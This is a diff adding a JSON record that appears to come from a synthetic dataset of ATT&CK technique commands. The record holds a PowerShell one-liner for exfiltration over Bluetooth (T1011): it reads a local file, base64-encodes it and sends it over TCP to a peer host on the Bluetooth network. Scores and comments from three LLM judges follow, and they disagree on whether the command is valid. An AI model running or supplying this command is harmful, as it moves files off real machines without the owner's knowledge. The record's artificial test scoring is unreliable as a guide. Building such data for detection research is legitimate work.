@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1011",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "& 'C:\\Tools\\BluetoothCL.exe' /connect 11-22-33-44-55-66 NAP | Out-Null; $i=(Get-NetAdapter | ?{$_.InterfaceDescription -match 'Bluetooth.*PAN' -or $_.Name -like 'Bluetooth*'} | select -First 1).Name; netsh interface ip set address name=\"$i\" static 10.226.38.2 255.255.255.252 | Out-Null; $buf=[IO.File]::ReadAllBytes('C:\\Users\\Public\\Music\\song.mp3'); $b=[Convert]::ToBase64String($buf); $cli=New-Object Net.Sockets.TcpClient; $cli.Client.Bind([Net.IPEndPoint]::new([Net.IPAddress]::Parse('10.226.38.2'),0)); $cli.Connect('10.226.38.1',54295); $ns=$cli.GetStream(); [byte[]]$head=[Text.Encoding]::UTF8.GetBytes('POST /d HTTP/1.0`r`nX: bt`r`n`r`n'); $ns.Write($head,0,$head.Length); $bts=[Text.Encoding]::UTF8.GetBytes($b); $ns.Write($bts,0,$bts.Length); $ns.Close(); $cli.Close()",
+  "explanation": "Encodes binary data and transmits it as an HTTP-like POST over a custom TCP port bound to the Bluetooth PAN IP, leveraging the alternate Bluetooth medium (T1011).",
+  "rationale_steps": [
+    "Connect to a Bluetooth NAP to establish Bluetooth networking.",
+    "Configure the Bluetooth interface with a static IP via netsh.",
+    "Bind TCP client to the Bluetooth IP to constrain the egress path.",
+    "Send base64 payload over a high, uncommon TCP port using HTTP-like framing."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1011-f4a0ca3c-de7999c0",
+  "source_prompt_hash": "f4a0ca3c",
+  "timestamp_utc": "2025-09-30T08:29:05.159712Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "The PowerShell one-liner is well-formed with balanced quotes, proper separators, and valid cmdlet and method invocations.",
+        "semantic_score": 3,
+        "semantic_justification": "It aligns with T1011 by attempting Bluetooth PAN exfiltration via a TCP client bound to the PAN IP, but depends on questionable BluetoothCL /connect semantics, requires admin rights to set a static IP despite claiming none, and uses backtick CRLFs inside single quotes (likely sending literal backticks), reducing operational plausibility.",
+        "combined_score": 4.0,
+        "confidence": 0.7,
+        "timestamp": "2025-10-01T01:44:18.596894Z"
+      },
+      {
+        "model": "claude-sonnet-4-6",
+        "syntactic_score": 3,
+        "syntactic_justification": "The command is largely well-formed PowerShell with balanced parentheses and valid pipeline usage, but the backtick-r-backtick-n sequences inside single-quoted strings ('POST /d HTTP/1.0`r`nX: bt`r`n`r`n') are a syntax issue since single-quoted strings in PowerShell do not process escape sequences, meaning the CRLF sequences would be sent as literal backtick characters rather than actual carriage return/newline bytes.",
+        "semantic_score": 4,
+        "semantic_justification": "The command credibly implements T1011 by connecting via Bluetooth PAN using BluetoothCL.exe, assigning a static IP to the Bluetooth network adapter, reading and base64-encoding a file, then transmitting it over TCP bound to the Bluetooth PAN interface IP — the overall flow is operationally plausible and well-aligned with exfiltration over an alternate network medium, with only the single-quote escape sequence issue and reliance on a third-party tool (BluetoothCL.exe) slightly reducing realism.",
+        "combined_score": 3.5,
+        "confidence": 0.82,
+        "timestamp": "2026-02-18T22:13:26.777430Z"
+      },
+      {
+        "model": "gemini-3-flash-preview",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is a perfectly well-formed PowerShell script with balanced brackets, proper use of semicolons, correct backtick escaping for CRLF characters, and valid .NET class calls.",
+        "semantic_score": 4,
+        "semantic_justification": "The command logically achieves the goal of exfiltrating data over a Bluetooth interface by binding a TCP client to the Bluetooth adapter's IP; however, the 'netsh' command for setting a static IP address requires administrative privileges, which conflicts with the 'Privilege: None' metadata.",
+        "combined_score": 4.5,
+        "confidence": 1,
+        "timestamp": "2026-02-18T22:13:29.219007Z"
+      }
+    ],
+    "llm_average_syntactic": 4.333,
+    "llm_average_semantic": 3.667,
+    "llm_average_score": 4.0,
+    "llm_verdict": "uncertain",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
